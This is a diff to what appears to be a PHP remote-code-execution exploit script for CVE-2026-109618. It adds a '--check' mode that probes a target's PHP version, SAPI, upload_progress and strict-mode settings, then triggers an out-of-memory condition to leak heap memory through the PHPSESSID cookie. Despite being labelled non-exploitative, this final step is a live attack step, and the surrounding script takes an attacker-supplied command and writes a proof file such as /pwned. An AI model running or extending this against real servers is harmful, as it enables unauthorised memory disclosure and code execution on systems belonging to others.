@@ -708,6 +708,210 @@ def check_proof_http(host: str, port: int, proof_path: str) -> str | None:
 
 
 # ---------------------------------------------------------------------------
+# Vulnerability checker (--check mode)
+# ---------------------------------------------------------------------------
+def check_vuln(host: str, port: int, path: str, mem_mb: int = 0) -> int:
+    """Non-exploitative vulnerability check for CVE-2026-109618.
+
+    Runs 5 preflight checks + 1 definitive OOM disclosure test.
+    Returns 0 if vulnerable, 1 if not.
+    """
+    print("=" * 60)
+    print("CVE-2026-109618: Vulnerability Check")
+    print("=" * 60)
+    print(f"Target: {host}:{port}{path}")
+    print()
+    results = {}
+
+    # Check 1: PHP version
+    print("[1/6] PHP version")
+    version = fingerprint(host, port, path)
+    if version:
+        print(f"  PHP/{version}")
+        if is_patched(version):
+            print(f"  PATCHED -- not vulnerable")
+            results["version"] = False
+        else:
+            print(f"  UNPATCHED -- potentially vulnerable")
+            results["version"] = True
+    else:
+        print("  Could not detect (X-Powered-By hidden)")
+        results["version"] = None
+
+    # Check 2: SAPI detection (mod_php vs FPM)
+    print("[2/6] SAPI detection")
+    req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+           f"Connection: close\r\n\r\n").encode()
+    resp = send_raw(host, port, req, timeout=10)
+    hdrs = resp.split(b"\r\n\r\n")[0] if b"\r\n\r\n" in resp else resp[:1024]
+    sapi = None
+    server_m = re.search(rb"Server:\s*(.+?)[\r\n]", hdrs)
+    server_val = server_m.group(1).decode("latin-1", "replace") if server_m else ""
+    if b"Apache" in hdrs and b"PHP" in hdrs:
+        sapi = "mod_php"
+        print(f"  mod_php (Server: {server_val})")
+    elif b"nginx" in hdrs.lower():
+        sapi = "fpm"
+        print(f"  nginx frontend -- likely FPM (Server: {server_val})")
+        print("  FPM workers crash on OOM; cross-request chain fails")
+    elif b"FPM" in resp:
+        sapi = "fpm"
+        print("  FPM detected in response")
+    else:
+        if server_val:
+            print(f"  Server: {server_val}")
+        else:
+            print("  Could not determine SAPI")
+    results["sapi"] = sapi
+
+    # Check 3: session.upload_progress.enabled
+    print("[3/6] upload_progress enabled")
+    check_sid = b"checkprogress00001"
+    probe_parts = [
+        {"name": "PHPSESSID", "data": check_sid},
+        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"check"},
+        {"name": "f", "filename": "test.txt", "data": b"x"},
+    ]
+    probe_body = build_multipart(probe_parts, b"CHECKBNDRY1234")
+    probe_resp = send_post(host, port, path, probe_body, b"CHECKBNDRY1234",
+                           timeout=10,
+                           extra_headers={"Cookie": f"PHPSESSID={check_sid.decode()}"})
+    has_progress = False
+    if probe_resp and b"PHPSESSID=" in probe_resp:
+        has_progress = True
+        print("  Yes -- server set PHPSESSID on upload_progress request")
+    elif probe_resp and b"200 OK" in probe_resp[:50]:
+        has_progress = True
+        print("  Likely yes -- 200 OK with upload (no Set-Cookie because session existed)")
+    else:
+        print("  No PHPSESSID returned -- upload_progress may be disabled")
+    results["upload_progress"] = has_progress
+
+    # Check 4: session.use_strict_mode
+    print("[4/6] strict_mode off")
+    strict_sid = b"strictmodecheck001"
+    strict_parts = [
+        {"name": "PHPSESSID", "data": strict_sid},
+        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"check"},
+        {"name": "f", "filename": "test.txt", "data": b"x"},
+    ]
+    strict_body = build_multipart(strict_parts, b"CHECKBNDRY5678")
+    strict_resp = send_post(host, port, path, strict_body, b"CHECKBNDRY5678",
+                            timeout=10,
+                            extra_headers={"Cookie": f"PHPSESSID={strict_sid.decode()}"})
+    strict_cookie = parse_cookie(strict_resp)
+    strict_off = False
+    if strict_cookie == strict_sid:
+        strict_off = True
+        print("  Yes -- server accepted attacker-chosen session ID")
+    elif strict_cookie:
+        print(f"  No -- server replaced session ID (strict_mode=On)")
+    else:
+        req2 = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+                f"Cookie: PHPSESSID={strict_sid.decode()}\r\n"
+                f"Connection: close\r\n\r\n").encode()
+        resp2 = send_raw(host, port, req2, timeout=10)
+        c2 = parse_cookie(resp2)
+        if not c2:
+            strict_off = True
+            print("  Yes -- server accepted attacker-chosen session ID (no replacement)")
+        elif c2 == strict_sid:
+            strict_off = True
+            print("  Yes -- server echoed back attacker-chosen session ID")
+        else:
+            print(f"  No -- server issued new session ID (strict_mode=On)")
+    results["strict_mode_off"] = strict_off
+
+    # Check 5: memory_limit detection
+    print("[5/6] memory_limit")
+    if mem_mb > 0:
+        detected_mb = mem_mb
+        print(f"  Using provided: {detected_mb}M")
+    else:
+        detected_mb = probe_memory_limit(host, port, path)
+        if detected_mb:
+            print(f"  Detected: {detected_mb}M (finite -- OOM reachable)")
+        else:
+            print("  Could not detect (display_errors may be off, or limit is -1)")
+    results["memory_limit"] = detected_mb
+
+    # Check 6: Definitive OOM disclosure test
+    print("[6/6] OOM disclosure test")
+    if results["version"] is False:
+        print("  Skipped -- patched version")
+        results["disclosure"] = False
+    elif not results["upload_progress"]:
+        print("  Skipped -- upload_progress not available")
+        results["disclosure"] = False
+    elif not detected_mb:
+        print("  Trying common memory limits (8, 16, 32, 64, 128)...")
+        disclosure = False
+        for try_mb in (8, 16, 32, 64, 128):
+            huge = try_mb + 12
+            resp_a = stage1_oom(host, port, path, huge)
+            if resp_a and b"Allowed memory size" in resp_a:
+                time.sleep(0.2)
+                cookie = stage1_leak(host, port, path, 900, 48)
+                if len(cookie) > 40:
+                    print(f"  VULNERABLE -- OOM at {try_mb}M leaked {len(cookie)}B cookie")
+                    disclosure = True
+                    break
+        if not disclosure:
+            print("  Could not trigger OOM disclosure")
+        results["disclosure"] = disclosure
+    else:
+        huge = detected_mb + 12
+        resp_a = stage1_oom(host, port, path, huge)
+        if not resp_a or b"Allowed memory size" not in resp_a:
+            print("  OOM not triggered")
+            results["disclosure"] = False
+        else:
+            time.sleep(0.2)
+            cookie = stage1_leak(host, port, path, 900, 48)
+            if len(cookie) > 40:
+                print(f"  VULNERABLE -- leaked {len(cookie)}B via PHPSESSID cookie")
+                results["disclosure"] = True
+            else:
+                print(f"  OOM triggered but cookie is normal ({len(cookie)}B)")
+                print("  May need different heap state (try restarting the target)")
+                results["disclosure"] = False
+
+    # Verdict
+    print()
+    print("=" * 60)
+    if results.get("disclosure"):
+        print("VERDICT: VULNERABLE")
+        print("=" * 60)
+        print("  CVE-2026-109618 confirmed: OOM corruption leaks heap memory")
+        print("  via PHPSESSID cookie. RCE is achievable with calibrated exploit.")
+        if sapi and sapi != "mod_php":
+            print(f"  WARNING: SAPI is {sapi}, not mod_php. RCE chain may not work.")
+        if not results.get("strict_mode_off"):
+            print("  WARNING: strict_mode appears on. Exploit needs attacker-chosen SID.")
+        return 0
+    elif results.get("version") is False:
+        print("VERDICT: NOT VULNERABLE (patched)")
+        print("=" * 60)
+        return 1
+    else:
+        print("VERDICT: NOT CONFIRMED")
+        print("=" * 60)
+        reasons = []
+        if not results.get("upload_progress"):
+            reasons.append("upload_progress not detected")
+        if results.get("version") is None:
+            reasons.append("PHP version hidden")
+        if not results.get("memory_limit"):
+            reasons.append("memory_limit unknown")
+        if sapi == "fpm":
+            reasons.append("FPM SAPI (workers crash on OOM)")
+        if reasons:
+            print(f"  Blockers: {'; '.join(reasons)}")
+        print("  Target may still be vulnerable but check could not confirm it.")
+        return 2
+
+
+# ---------------------------------------------------------------------------
 # Main orchestrator
 # ---------------------------------------------------------------------------
 def main() -> int:
@@ -738,6 +942,8 @@ def main() -> int:
                     help="proof file path inside the target")
     ap.add_argument("--fetch", default=None,
                     help="HTTP path to fetch proof from (e.g. /pwned)")
+    ap.add_argument("--check", action="store_true",
+                    help="vulnerability check only, no exploitation")
     ap.add_argument("--docker-cmd", default="sg docker -c",
                     help="docker command prefix")
     args = ap.parse_args()
@@ -746,6 +952,9 @@ def main() -> int:
     host = u.hostname or "127.0.0.1"
     port = u.port or 80
     path = u.path or "/index.php"
+
+    if args.check:
+        return check_vuln(host, port, path, args.memory_limit)
 
     cmd_bytes = args.command.encode()
     if len(cmd_bytes) > MAX_CMD:
